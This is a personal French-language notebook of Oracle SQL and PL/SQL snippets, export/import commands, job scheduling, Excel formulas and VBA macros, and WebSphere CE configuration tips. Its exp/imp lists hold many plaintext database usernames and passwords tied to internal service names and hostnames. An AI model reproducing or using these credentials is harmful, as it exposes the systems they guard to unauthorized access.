			                      FROM t_lot_import t WHERE statut_import IN ('Importe') ORDER BY ID_LG	ASC
                        ) inner_query
          			  WHERE ROWNUM <= (20)
              ) outer_query  
        WHERE outer_query.query_rownum >= (1)
requete pour faire un transpose (row ligne en colonnes) : (plusieurs techniques en fonction des besoins)
 exemple 1:                 (demande de jean-pierre dardart)
      Table:
      WEC51NOM WEC56NOMPHASE 
      baba bibi
      baba bobo
      baba binbin
      bubu  bibi
      bubu  binbin
      boubou  bibi
      boubou bobo
  on veut ca :
      baba : bibi, bobo, binbin
      bubu: bibi, binbin
      boubou: bibi, bobo
  j'ai fait comme ca :(mais il parrait qu'avec pivot ou transpose ya mieux. voire aussi listagg)
          select  count(wec51_nom), wec51_nom, wec51_active, wec51_class 
            , zz.wec56_nomphase
            , aa.wec56_nomphase
            , bb.wec56_nomphase
            , cc.wec56_nomphase
            , dd.wec56_nomphase
            , ee.wec56_nomphase
            , ff.wec56_nomphase
            , gg.wec56_nomphase
            , hh.wec56_nomphase
            , ii.wec56_nomphase
            , jj.wec56_nomphase
            , kk.wec56_nomphase
            , ll.wec56_nomphase
            , mm.wec56_nomphase
            from wec51_m_template 
            inner join wec56_m_valphase on wec56_idtemplate = wec51_id 
            left join wec56_m_valphase zz on zz.wec56_idtemplate = wec51_id and zz.wec56_id=0
            left join wec56_m_valphase aa on aa.wec56_idtemplate = wec51_id and aa.wec56_id=1
            left join wec56_m_valphase bb on bb.wec56_idtemplate = wec51_id and bb.wec56_id=2
            left join wec56_m_valphase cc on cc.wec56_idtemplate = wec51_id and cc.wec56_id=3
            left join wec56_m_valphase dd on dd.wec56_idtemplate = wec51_id and dd.wec56_id=4
            left join wec56_m_valphase ee on ee.wec56_idtemplate = wec51_id and ee.wec56_id=5
            left join wec56_m_valphase ff on ff.wec56_idtemplate = wec51_id and ff.wec56_id=6
            left join wec56_m_valphase gg on gg.wec56_idtemplate = wec51_id and gg.wec56_id=7
            left join wec56_m_valphase hh on hh.wec56_idtemplate = wec51_id and hh.wec56_id=8
            left join wec56_m_valphase ii on ii.wec56_idtemplate = wec51_id and ii.wec56_id=9
            left join wec56_m_valphase jj on jj.wec56_idtemplate = wec51_id and jj.wec56_id=10
            left join wec56_m_valphase kk on kk.wec56_idtemplate = wec51_id and kk.wec56_id=11
            left join wec56_m_valphase ll on ll.wec56_idtemplate = wec51_id and ll.wec56_id=12
            left join wec56_m_valphase mm on mm.wec56_idtemplate = wec51_id and mm.wec56_id=13
            group by wec51_nom, wec51_active, wec51_class, zz.wec56_nomphase, aa.wec56_nomphase, bb.wec56_nomphase, cc.wec56_nomphase, dd.wec56_nomphase, ee.wec56_nomphase, ff.wec56_nomphase, gg.wec56_nomphase, hh.wec56_nomphase, ii.wec56_nomphase, jj.wec56_nomphase, kk.wec56_nomphase, ll.wec56_nomphase, mm.wec56_nomphase order by wec51_ACTIVE, wec51_nom
les synonymes oracle : schemas shemas : 
      un user dpf_r peut avoir les droits (grant) en lecture voir visible sur les tables : 
          quand on affiche avec un client la liste des tables il peut les voir sous le fichier d'un autre user qui a les droit adm par ex.
          Mais quand on fait une requete ca ne marchera pas sauf si on ecrit les requetees comme ca : dpf_adm.MaTable... etc...
          dans ce cas si on ne veut pas avoir a faire ca il faut defninir les synonyme = liens vers la table de l'adm
          CREATE or replace SYNONYM  DPF01_PAIEMENTS FOR dpf_adm.DPF01_PAIEMENTS
pour voir tous les users schemas shemas
  SELECT username FROM all_users ORDER BY username;
pour voir toutes les tables invisibles :
    describe all_tables; select table_name from all_tables;          
tnsnames.ora se trouve sous C:/Oracle/Ora81/network/ADMIN (pour savoir ou il est tapper: env | grep tns*)
ou : c:/donnees/Oracle... etc
ou D:\oracle\ora92\network\ADMIN
exemple de tnsnames : 
        DPF_NEW_DEV.WORLD = 
          (DESCRIPTION=
            (ADDRESS=
              (COMMUNITY=TCPIP.world)(PROTOCOL=TCP)(Host=hpsd1805.mc2.renault.fr )(Port=1526)
            )(CONNECT_DATA=
              (service_name=dpfdevo01)
            )
          )
          
        ADU_INT.WORLD = 
          (DESCRIPTION=
            (ADDRESS=
              (COMMUNITY=TCPIP.world)(PROTOCOL=TCP)(Host=hpsd1805.mc2.renault.fr )(Port=1567)
            )(CONNECT_DATA=
              (service_name=aduinto01 )
            )
          )
          
si message ORA-12154 TNS could not resolve service name : c juste parce que peut etre il ya un espace dans le fichier TNS

oracle: select * from V$instance ou select * from V$VERSION pour connaitre la version oracle et infos de la base de donnee

oracle: sous instance/DB_EGN/audit/xxx.amd ce sont des fichiers de logs on peut les effacer.
How can I determine the charactersets (charset) that I have for my version of Oracle? encodage
			  SQL> SELECT UNIQUE VALUE FROM V$NLS_VALID_VALUES WHERE PARAMETER ='CHARACTERSET'; 
			SQL > SELECT * FROM V$NLS_PARAMETERS 
      ou
       SELECT * FROM NLS_DATABASE_PARAMETERS
Pour vider delete une table sans possibilite de rollback :
		 plus efficace rapide etc.. suppression systeme : faire Truncate table nomdelatble; c'est comme un delete mais plus efficace et pas de commit possible. Il faut avoir des droit pour pouvoir faire ca.
Si on a une erreur: ORA-01843: 
			not a valid month alors que la requete d'insersion de date semble bonne:
			Insert into CP40_DELEGA (CP40DATEDEBUT) values ('05/06/2008'); (bon normalement il faut faire un to_date...)
			faire ca:select * from NLS_SESSION_PARAMETERS ; on voit alors une ligne avec ca: NLS_DATE_FORMAT DD-MON-RR. Faire ca: alter session set NLS_DATE_FORMAT = 'DD/MM/YYYY'; Verifier avec ca: select * from NLS_SESSION_PARAMETERS ;
			pour desactiver une contrainte:
			 alter table TA_TABLE disable constraint TA_CONTRAINTE;
pour reactiver une contrainte:
			 alter table TA_TABLE enable constraint TA_CONTRAINTE;
pour faire un export de dump d'une base: 
			aller sur dos faire: exemple :    (mettre C:\oracle\product\10.2.0\db_1\BIN\ avant maintenant car oracle 10g)
			set ORACLE_SID=wecopeo01
			exp wec_adm/wecprod1234@WECPRODOLD
			exp wec_adm file=wec.dump log=wec.log consistent=yes compress=no buffer=100000
			exp pae_adm/pae_adm_01@SIA.INT  
			exp r08_r/r08_r_r08@GDV_PROD.WORLD
			exp r08_adm/r08_adm_int01@GDV_INT10.WORLD
			exp r08_adm/r08_adm@GDV_DEV.WORLD
			exp pae_adm/pae_adm_01@PAE9INT.WORLD 
			exp pae_adm/pae_adm_01@PAE9DEV.WORLD tables=(PAE99_LBL) ignore=y 
			exp RC9_ADM/rc9_adm_01@RC9DEV.WORLD
			exp RC9_ADM/rc9_adm_01@RC9INTEG.WORLD
			exp opa_adm/opa_adm_01@OPA_DEV.WORLD
			exp opa_adm/opa_adm_int01@OPA_INT.WORLD
			exp opa_r/patazg3@OPA_RE7.WORLD
			exp dwi_r/dwi_r@DWI_RE7.WORLD
			exp dwi_adm/dwi_adm_01@DWI_DEV.WORLD
			exp dwi_adm/dwi_adm_int01@DWI_INT.WORLD
			exp RDV_R/g786fsdg3@RDVOPER.WORLD
			exp dpfdev/dpfdev123@DPF_OLD_DEV.WORLD
			exp adu_adm/adu_adm_int01@ADU_INT.WORLD
			exp Cpi_adm/passtmp@CPI_RE7.WORLD
			exp dpfdev/dpfdev123@DPF_DEV9.WORLD
			exp dpf_adm/dpf_adm_01@DPF_DEV10.WORLD
			exp mel_adm/mel_adm_01@MEL_DEV10.WORLD
			exp pve_adm/pve_adm@PVE_DEV.WORLD
			exp doa_adm/doa_adm_01@DOA_INT.WORLD 
			exp pur_r/22prre7@PUR_RE7.WORLD tables=(PU01_DOCUMENT, PU01_DOCUMENT_TEST, PU02_TRACE) ignore=y
      exp spo_adm/spo_adm_01@SPO_DEV.WORLD
      exp wec_adm/wecprod1234@WEC_PROD.WORLD tables=(wec51_m_template,wec52_m_champs,wec55_d_valchm,wec72_m_chmsce,wec71_m_sce)
      exp wec_adm/wec1234@WEC_DEV.WORLD tables=(wec51_m_template,wec52_m_champs,wec55_d_valchm,wec72_m_chmsce,wec71_m_sce)
      exp wec_adm/wec1234@WEC_RE7.WORLD tables=(wec52_m_champs,wec72_m_chmsce)
			


jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=hpsd1805.mc2.renault.fr)(PORT=1526)))(CONNECT_DATA=(SERVICE_NAME=meldevo01)))
			il enregistre sous: C:\Documents and Settings\Administrator un fichier qui s'appelle par defaut EXPDAT.DMP

pour faire un import:  (si ca ne marche pas, essayer sur TestScripts et un enviroennement env_10) 
(mettre C:\oracle\product\10.2.0\db_1\BIN\ avant maintenant car oracle 10g)
avant de pouvoir le faire peut etre faire des truncate
      imp WEC_ADM/dsfh1u1w@WECPRODJBOSS
			imp sia_adm/sia_adm_01@sia.INT tables=(TB0008_SAISIE, TBbalblabla)(optionnel: c'est si on veut limiter les imports à ddes tables) exemples:
			imp pae_adm/pae_adm_01@PAE9INT.WORLD tables=(PAE99_LBL) ignore=y
			pour importer que le data d'une table dejà existante mettre à la fin l'option ignore=y
			imp r08_adm/r08_adm@GDV_DEV.WORLD tables=(R0801_AUTO_ROLE, R0802_ROLES, R0803_HISTORIQUE_VISITEURS, R0804_DELEGATIONS, R0805_SITES, R0806_ETABLISSEMENTS, R0807_PROFILS, R0808_BATIMENTS, R0809_POINTS_ACCUEIL, R0810_SERVICES_AUTORISES, R0811_SITES_SITES_AUTORISES, R0812_SITES_PLANS_ACCES, R0813_PREAVIS, R0814_VISITEURS_PREAVIS, R0815_ANOMALIES, R0816_ETATS_VISITEURS, R0899_GRP, R0899_IDE, R0899_LBL) ignore=y
			imp r08_adm/r08_adm@GDV_DEV.WORLD ignore=y
			imp r08_adm/r08_adm_int01@GDV_INT9.WORLD ignore=y
			imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0001_INSTANCE) ignore=y
     			INT
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0001_INSTANCE) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0014_USER) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0002_ADMIN_INSTANCE) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0011_THEME) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0010_CATEGORIE) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0007_SERIE) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0003_STRUCT_INTERM) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0005_SECTEUR) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0012_VALIDE) ignore=y
            imp cdd_adm/cdd_adm_01@CDD.INT tables=(TB0008_SAISIE) ignore=y
            #imp cdd_adm/cdd_adm_01@CDD.INT tables=(CDD99_LBL) ignore=y
            DEV:
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0001_INSTANCE) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0014_USER) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0002_ADMIN_INSTANCE) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0011_THEME) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0010_CATEGORIE) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0007_SERIE) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0003_STRUCT_INTERM) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0005_SECTEUR) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0012_VALIDE) ignore=y
            imp cdd_adm/cdd_adm@CDD.DEV tables=(TB0008_SAISIE) ignore=y
            #imp cdd_adm/cdd_adm@CDD.DEV tables=(CDD99_LBL) ignore=y
			imp pae_adm/pae_adm_01@PAE9INT.WORLD tables=(TB0007_HISTOCTXT) ignore=y
			imp opa_adm/opa_adm_01@OPA_AQL.WORLD
			imp opa_adm/opa_adm_01@OPA_DEV.WORLD
			imp opa_adm/opa_adm_int01@OPA_INT.WORLD
			imp opa_adm/opa_adm_int01@OPAINT
			imp dwi_adm/dwi_adm_01@DWI_DEV.WORLD  ignore=y
			imp dwi_adm/dwi_adm_int01@DWI_INT.WORLD  ignore=y
			imp rdv_adm/rdv_adm_01@RDVDEV.WORLD tables=(RDV99_LBL, RDV99_IDE, RDV99_GRP) ignore=y
			imp dpf_adm/dpf_adm_01@DPF_DEV10.WORLD  ignore=y
      imp adu_adm/adu_adm_01@ADU_DEV.WORLD  ignore=y
      imp adu_adm/adu_adm_01@ADUDEV  ignore=y
      imp pve_adm/pve_adm@PVE_DEV.WORLD  ignore=y
      imp pve_adm/pve_adm_01@PVE_INT.WORLD  ignore=y
      imp doa_adm/doa_adm_int01@DOA_INT10.WORLD  ignore=y
      imp r08_adm/r08_adm@GDV_DEV10.WORLD ignore=y
      imp r08_adm/r08_adm_01@GDV_DEV10RAJESH.WORLD ignore=y
      imp pur_adm/pur_adm@PUR_DEV.WORLD ignore=y  tables=(PU02_TRACE, PU01_DOCUMENT, PU01_DOCUMENT_TEST)
      imp spo_adm/spo_adm_01@SPO_DEV.WORLD ignore=y
      imp wec_adm/wec1234@WEC_DEV.WORLD ignore=y  tables=(wec99_grp,wec99_ide,wec99_lbl)
      
sia.int est sur tnsnames.ora dans D:\oracle\ora92\network\ADMIN (pour savoir ou il est tapper: env | grep tns*)
pour creer une sequence: 
	CREATE SEQUENCE ma_sequence START WITH 5 INCREMENT BY 3;
pour modifier une sequence:
on peut faire alter sequence: 
			alter sequence EDI03_FOURNISSEURS_SEQUENCE maxvalue 20000 cycle ou nocycle etc etc...
			alter sequence ma_sequence increment by -41 maxvalue 100 cycle nocache;
	on ne peut pas changer start with xxx mais solution de contournement ci dessous: (attention il faut tout jouer sinon il incrementera trop)
			alter sequence pve_seq_profile_id increment by 4000;
			select pve_seq_profile_id.nextval from dual;
			alter sequence pve_seq_profile_id increment by 1;
			
pour connaitre les sequences: 
			select SEQUENCE_NAME,LAST_NUMBER from user_sequences;
			renvoit:
			SEQUENCE_NAME                  LAST_NUMBER
			------------------------------ -----------
			SQ_ID_ANOMALIE_NTI_SEQ                2261
			SQ_ID_ANOMALIE_UI_SEQ                    1
			SQ_ID_DIFFUSION                          1
			SQ_ID_DOMAINE_SEQ                        1
			SQ_ID_EXPORT_SEQ                         1
			SQ_ID_UI_SEQ                         12753
			SQ_ID_USER_DIALO_SEQ                     1
			SQ_LOT_SUR_BANDE_SEQ                    21
			SQ_NTI_SEQ                               1
			SQ_RDC_SEQ                               1
			SQ_SPI_SEQ                              21
			

pour avoir la valeur suivante d'une sequence: 
			select SQ_ID_UI_SEQ.nextval from dual;
pour avoir la valeur courrente current d'une sequence
			select SQ_ID_UI_SEQ.currval from dual; (attention la valeur renvoyee n'est pas garantie car rien ne garantisse qu’un autre thread ne l’ait pas dejà fait evoluer.)
			renvoit:
			   NEXTVAL
			----------
			     12753
     
exemple d'utilisation de requete d'insertion avec les sequences: 
				INSERT INTO PVE_UTILISATEUR (ID, IPN, FK_UET, FK_ATELIER, DELETED) VALUES (pve_seq_utilisateur_id.nextval, 'p036782',NULL,NULL,'N');
				INSERT INTO PVE_L_PROFILE (ID, FK_PROFILE, FK_UTILISATEUR) VALUES(pve_seq_profile_id.nextval, 1, pve_seq_utilisateur_id.currval); (attention la valeur renvoyee n'est pas garantie car rien ne garantisse qu’un autre thread ne l’ait pas dejà fait evoluer.)


pour voir la liste des tablespaces: 
				select * from usertable where tablespace name like ".."    
				ou 
				select * from user_tables where tablespace_name like '..'
pour avoir la taille des tablespaces : 
      mais il faut avoir les droits pour ca
      SELECT a.tablespace_Name, A.Alloue, B.Occupe, C.Libre
     FROM (select tablespace_name, sum(bytes)/1024/1024 AS ALLOUE from dba_data_files group by tablespace_name) a,
     (select tablespace_name, Sum(bytes)/1024/1024 AS OCCUPE from dba_segments group by tablespace_name) b,
     (select tablespace_name, Sum(bytes)/1024/1024 AS LIBRE from dba_free_space group by tablespace_name) c
     WHERE a.tablespace_Name = b.tablespace_Name
     AND c.Tablespace_Name = b.Tablespace_Name; 
				
si j'ai l'erreur ORA-01653:
      ALTER DATABASE DECDEV DATAFILE 'DATA_FAITS' AUTOEXTEND ON
      ALTER DATABASE dpfdevo01 DATAFILE 'DPF_D1' AUTOEXTEND ON 
pour afficher le contenu des procedures stockees procedure stockee (elles peuvent être dans des packages): exemple: (chaque ligne correspond à une ligne du texte de la proc)
        SELECT * FROM all_source WHERE  OWNER like 'PVE_ADM' and text like '%FUNCTION%'
        SELECT * FROM all_source WHERE  OWNER not like 'SYS' and name = 'PVE_DT_DEMANDE' and type = 'PACKAGE BODY' and TEXT like 'FUNCTION LIST_DT%'
        SELECT * FROM all_source WHERE  OWNER not like 'SYS' and name = 'PVE_DT_DEMANDE' and type = 'PACKAGE BODY' and line > 567 and line < 609 ORDER BY line

----------------------
pour definir une queue à  executer sous oracle:
Après avoir lance les reqettes sql de creation du job et du process(voir ci dessous)
sil faut signaler à  oracle qu'il y a une queue à  executer:

su - oracle
instance DB_EGN
svrmgrl
connect internal
shutdown immediate

dans une autre fenetre aller sous
oracle/Instances/DB_EGN/dbs/
faire vi initDB_EGN.ora ou ini.ora.. enfin celui qui nous interesse...
rajouter tout à  la fin du fichier la ligne:
JOB_QUEUE_PROCESS=1

sauver et quitter vi: 
:qw

retourner à  la fenetre precedente et tapper
startup pfile=/home00/oracle/Instances/DB_EGN/dbs/initDB_EGN.ora  (le chemin du fichier qu'on vient de modifier)

---------------------------
-- To submit a new job to the job queue, use the SUBMIT procedure in the DBMS_JOB package

VARIABLE jobno number;

begin

-- DBMS_JOB.SUBMIT( job             OUT    BINARY_INTEGER,
--                  what             IN    VARCHAR2,
--                  next_date        IN    DATE DEFAULT SYSDATE,
--                  interval         IN    VARCHAR2 DEFAULT 'null',
--                  no_parse         IN    BOOLEAN DEFAULT FALSE)

DBMS_JOB.SUBMIT(  :jobno,
                  'update_egn_history;',
                  TRUNC(LAST_DAY(SYSDATE)),
                  'TRUNC(LAST_DAY(SYSDATE))', 
                  FALSE);
            
-- S'assurer que ceci est compatible avec contrat de service
-- 'NEXT_DAY(TRUNC(LAST_DAY(SYSDATE)))', 
-- SYSDATE+2/1440,   dans 2 min
              

commit;
end;
/

print jobno


--------------------
-- Suppression d'un job
begin
dbms_job.remove(10);
commit;
end;
/

-- Execution d'un job
begin
dbms_job.run(64);
commit;
end;
/

-- Selection sur la table des jobs pour verification
--SELECT job,
--       what,
--       last_date,
--       last_sec,
--       next_date,
--       next_sec,
--       interval
--FROM user_jobs;

SELECT job||';'||what||';'||last_date||';'||last_sec||';'||next_date||';'||next_sec||';'||interval
FROM user_jobs;

-----------------------------
pour creer ou remplacer une fonction :
        CREATE OR REPLACE FUNCTION LIST_DT as
            (
                in_atelier IN PVE_ATELIER.id%TYPE,
                in_utilisateur IN PVE_UTILISATEUR.id%TYPE,
                in_vh_pgm IN PVE_VEHICLE.pgm_vh%TYPE,
                in_vh_atelier IN PVE_VEHICLE.atelier%TYPE,
                in_vh_n_atelier IN PVE_VEHICLE.n_atelier%TYPE,
                in_vh_n_ordre IN PVE_VEHICLE.n_ordre%TYPE,
                in_row_begin IN NUMBER,
                in_row_end IN NUMBER,
                in_sort IN VARCHAR2,
                in_order IN VARCHAR2,
                in_type IN NUMBER,
                in_lang IN PVE01_LBL.pve01idlng%TYPE,
                        in_demandeurIPN IN PVE_UTILISATEUR.ipn%TYPE,
                        in_dt_n IN PVE_DT.DT_N%TYPE,
            in_fk_uet IN PVE_UTILISATEUR.ipn%TYPE
         
            )
            RETURN RESULTSET
        pour le corp de la fonction je ne sais pas comment on fait
pour creer une procedure:

CREATE OR REPLACE procedure update_egn_history
is

cursor stats is select METIER, SEMAINES from egn_stat where SEMAINES !=0;
	num_ligne NUMBER(1);
	semaine_prec NUMBER(3);
	semaine_suiv NUMBER(3);
	metier VARCHAR2(80);// ici ca veut dire qu'il met 200 bytes (pas 200 caracteres) si on veut 200 caracters il faut mettre VARCHAR2(200 char) sous reserve que le paramètre de base NLS_LENGTH_SEMANTICS soit positionne à  sa valeur defaut : BYTE).
	semaines NUMBER;

begin

	select count(*) into num_ligne from egn_historique where rownum <2;
	if num_ligne > 0 then
	   	select max(semaine) into semaine_prec from egn_historique;
	else
	semaine_prec:= 0;
	end if;
	semaine_suiv:=semaine_prec+1;
	open stats;
	LOOP
		fetch stats into metier, semaines;
		exit when stats%NOTFOUND;
			INSERT INTO egn_historique (METIER, SEMAINE, VALEUR) values (metier, semaine_suiv, semaines);
	END LOOP;
	close stats;
	UPDATE egn_stat set semaines=0;
COMMIT;
end;
/

On ne peut pas modifier juste une fonction d'une procedure, il faut la compiler en entier
-----------------------------
pour passer le paramètre de base NLS_LENGTH_SEMANTICS soit positionne à  sa char:
			alter session set nls_length_semantics=char;
			requete pour connaitre le nsl_legth_semantics : select * from NLS_DATABASE_PARAMETERS
			il faut toujours mettre ses VARCHAR2 en char parce que oracle s'adapte: si la base est en iso il va mettre byte et si elle est en  utf-8 il va mettre du char.
	SQL*Loader sqlloader sqloader: (command sqlldr ou sqldr je crois)
		permet de charger des fichiers textes dans la base de donnee. Voir sur internet
pour liberer de la memoire, on peut supprimer les fichiers .trc
ps -ef | grep pmon pour voir quelles instances oracle tournent
ps -ef donne aussi la date de debut d'execution du process
init: taille initiale de la base
next: taille a a jouter a chaque depassement
minextend: nombre de blocs initiaux (en general 1)
maxextend: nombre de depassement autorise
				  t_ui tui,
				  t_ui_anomalie ano
				    WHERE tlich.id_import = outer_query.id_import
				    AND ano.IGNORE_ANOMALIE_UI = 1) +
				  (SELECT COUNT (a.id_import)
				  FROM  t_lot_import_anomalie a
				   WHERE a.id_import=  outer_query.id_import
				      AND a.ignore_anomalie = 1)) AS sumerrors    
				FROM (SELECT	inner_query.id_import, inner_query.id_lg,
						inner_query.date_import, inner_query.TYPE,
						inner_query.date_statut, inner_query.couleur,
						ROWNUM AS query_rownum
					FROM (SELECT   t.id_import, t.id_lg, t.date_import, t.TYPE, t.titre_global,
			  t.statut_import, t.libelle_spidoc, t.famille, t.prioritaire,
			  t.SOURCE
			, t.date_livraison, t.date_prioritaire
			     FROM t_lot_import t
			    WHERE statut_import IN ('Importe')
			  ORDER BY ID_LG
			ASC) inner_query
			  WHERE ROWNUM <= (20)) outer_query  WHERE outer_query.query_rownum >= (1)
     
PLSQL Oracle : 
pour ajouter une colonne
    ALTER TABLE WECM55_STORAGE_IAO_CONTROL ADD BUDGET VARCHAR2(20) (ce sera null par defaut si table existe deja etc...)
pour afficher le  descriptif d'une table
    desc  WECM55_STORAGE_IAO_CONTROL 
declare  
  iduiseq t_titre.id_ui_seq%TYPE;
  cursor uiseq (iduiseq NUMBER) is select id_ui_seq from t_titre;
BEGIN
open uiseq(0);
     LOOP
       FETCH uiseq INTO iduiseq;
       EXIT WHEN uiseq%NOTFOUND;
       update t_titre set n_ui=iduiseq where id_ui_seq =iduiseq;
    END LOOP;
END;
autre exemple: 
			declare  
			  lbl RC999_LBL.rc999idlbl%TYPE;
			  cursor r1_cur is select rc999idlbl FROM RC999_LBL WHERE RC999IDLBL LIKE 'RC9%';
			BEGIN
			open r1_cur;
			     LOOP
			       FETCH r1_cur INTO lbl;
			       EXIT WHEN r1_cur%NOTFOUND;
			       UPDATE RC999_LBL SET rc999idlbl= concat('OPA',substr(lbl,4)) WHERE lbl = RC999_LBL.rc999idlbl;
			    END LOOP;
			END;
			/ (mettre peut etre un slash a la fin du script pour lancer dans un editeur)
ou bien
		CREATE OR REPLACE PROCEDURE MPF_ADM.PROCEDURE1
					AS
					BEGIN
					declare  
					  iduiseq t_titre.id_ui_seq%TYPE;
					  cursor uiseq is select id_ui_seq from t_titre;
					OPEN uiseq;
					     LOOP
					       FETCH uiseq INTO iduiseq;
					       EXIT WHEN uiseq%NOTFOUND;
					       update t_titre set n_ui=iduiseq where id_ui_seq =iduiseq;
					    END LOOP;
					END;

manière plus simple: 
update T_TITRE set N_UI=to_char(ID_UI_SEQ);        

sql: Cast pour convertir un type en un autre:
CAST ( expression AS data_type [ (length ) ])

pour faire des requetes avec procedure stockee de type *.blabla faire: where description like "'%'||?||'%'"

paint :
    pour que la selection soit transparente transparante
        bouton selectionner> choisir transparant
Excell : excel :
  figer les volets Affichage > figer les volets
pour masquer le quadrillage lignes, colonnes:
  Outils > Options> cocher quadrillage  
Si les lignes ne s'ajustent pas automatiquement: tout ne rentre pas dans la case
  c'est parce que j'ai ecrit en gras et en gras ca prend plus de place dans la case mais pour autant la ligne n'ajuste pas sa hauteur: solution : augmenter un peu la taille de la police
fichier locke: apparition du nom de la personne qui locke. 
        Pour que votre nom apparaisse en clair, au lieu de votre IPN, lors d'une tentative d'accès 9 à un fichier Office (comme dans le message ci-dessous), cliquez sur "Outils - Options - General" dans Excel (ou "Outils - Options - Utilisateur" dans Word), et saisissez votre nom dans le champ "Nom d'utilisateur".
pour faire des mises en forme conditionnelles illimitees
		      voir le fichier MFC rapide illimite.xls que j'ai mis dans mon repertoire Laurent.
		      faire une feuille "MFC" et copier la macro suivante dans thisWorkbook (Outil>macro>visualBasicEditor>trouver thisWorkbook dans le panel a gauche)
                                        		      Private Sub Workbook_SheetChange(ByVal Sh As Object, ByVal Target As Range)
                                            Dim i As Integer, j As Long, Mfc As FormatCondition, c As Range, Ws1 As Worksheet
                                            On Error GoTo fin ' en cas de mauvaise manipulation, ça plante sur l'ordre suivant
                                            Application.EnableEvents = False
                                            Set Ws1 = Sheets("MFC")
                                            For i = 1 To Target.FormatConditions.Count
                                                Set Mfc = Target.FormatConditions(i)
                                                If UCase(Left(Mfc.Formula1, 7)) = "=MA_MFC" Then
                                                    Ws1.Range("A1").Value = Target.Value
                                                    Set c = Nothing
                                                    For j = 2 To Ws1.Range("A65536").End(xlUp).Row
                                                        If Ws1.Range("A" & j) = True Then
                                                            Set c = Ws1.Range("A" & j)
                                                            Exit For
                                                        End If
                                                    Next j
                                                    If c Is Nothing Then Set c = Ws1.Range("A1")
                                                    c.Copy
                                                    Target.PasteSpecial (xlPasteFormats)
                                                    Application.CutCopyMode = False
                                                End If
                                            Next i
                                            Application.EnableEvents = True
                                        fin:
                                            On Error GoTo 0
                                        End Sub
pour atteindre une cellule nommee: 
	Ctrl +T
pour avoir des chiffres à la place des lettres dans les colonnes
	outils>options> onglet general > style de referentiel
	2010: fichier > aide > options > formules >style de reference

premiers caracteres substring Droite
    STXT

pour savoir si une cellule est en erreur: 
	=esterreur(Cellule)
pour faire un diff entre deux dates: 
		soustraire deux dates: donner le nombre d'annees entre deux dates: (delta difference entre deux dates)
			15/10/2008 01/09/1974
			=ANNEE(A1) =ANNEE(B1) 
			=SI(MOIS(A1)<MOIS(B1);ANNEE(A1)-ANNEE(B1)-1;ANNEE(A1)-ANNEE(B1))
	en jours c'est simple : celluledate1-celluledate2
	diff entre deux dates sans les weekend (possibilite sans les jours feries)
	=NETWORKDAYS(O5,N5) (anglais)
	=NB.JOURS.OUVRES(...)
Pour ajouter des jours a une date
	le plus simple c'est tout simplement d'avoir la valeur en chiffre de la date a laquelle on veut ajouter des jours: exemple:=DATEVAL("04/01/2010") (si on veut faire reference à une cellule qui contient une date, celle ci doit etre au format texte)
	ensuite sur la celle suivante on met: =AD38+6 (ici je rajoute six jours). Changer le format de cette cellule en format date. Thats all.
si j'ai des dièses #### partout dans une cellule:
			c'est parce que mon champ texte est trop gros.
      soit je set le format de ma cellule à standard et la ca marche, 
      soit on ne peux rien y faire sauf soit augmenter colonne mais ne marche pas si plus de 255 caractères.
      Sinon reduire taille du texte à 255
si mon clavier est passe en mode qwerty:
		 faire Maj + Alt et il repasse en mode azerty
pour faire une macro qui recalcul tout à l'ouverture du fichier
				Sub auto_open()
				'
				' Macro1 Macro
				' Macro enregistree le 15/08/2008 par p040183
				'
				'
				    Application.MaxChange = 0.001
				    ActiveWorkbook.PrecisionAsDisplayed = True
				    
				    Application.CalculateFull
				   
				End Sub
chiffres/lettres modifier l'ordonne:
      outils > options > references > style de referenceL1CI
RechercheVerticale search vertical
    =VLOOKUP(A2;'Matcle Infos'!A:B;1;FALSE) /// attention il faut que les cellules soient au format texte des le départ
    ou 
    =VLOOKUP(G2*1;E1:E2321;1;TRUE) (multiplier par 1 si ca marche pas)
    =RECHERCHEV(...) 

empecher excel de creer des colonnes separateur separation
  toujours convertir et decocher les cases


WASCE21 :
    repository est dans: 
      C:\WASCE 2.1.0.1\ServerCommunityEdition_v2101\repository\default
    pour que les jsp se rechargement plus vite sans avoir a tout recompiler:
        copier la jsp que j'ai modifie dans le repertoire repository et aller dans catalina/web.xml et modifier les parametres: developpent et checkInterval
        double cliquer sur mon serveur et dans le pave publish : ne pas publier automatiquement
WASCe :
si j'ai le message : 
            Web application  ...  does not contain a WEB-INF/geronimo-web.xml deployment plan.  This may or may not be a problem, depending on whether you have things like resource references that need to be resolved.  You can also give the deployer a separate deployment plan file on the command line.
            rajouter le facet community 1.1
            et verifier que geronimo-application.xml et geronimo-web.xml n'ont pas le meme nom et sont coherants     
pour supprimer une connection à une database : 
    menu J2EE Connectors
 difference entre local et environnement de dev:
			1) Dans siaWeb/WebContent/geronimo-web.xml :
			En local :
			<nam:resource-ref>
			    <nam:ref-name>jdbc/Datasource</nam:ref-name>
			    <nam:resource-link>siaDatasource</nam:resource-link>
			  </nam:resource-ref>
			  <security-realm-name>ARCA</security-realm-name>
			En dev :
			<nam:resource-ref>
			    <nam:ref-name>jdbc/Datasource</nam:ref-name>
			    <nam:resource-link>sia/jdbc/Datasource</nam:resource-link>
			  </nam:resource-ref>
			  <security-realm-name>arca</security-realm-name> 
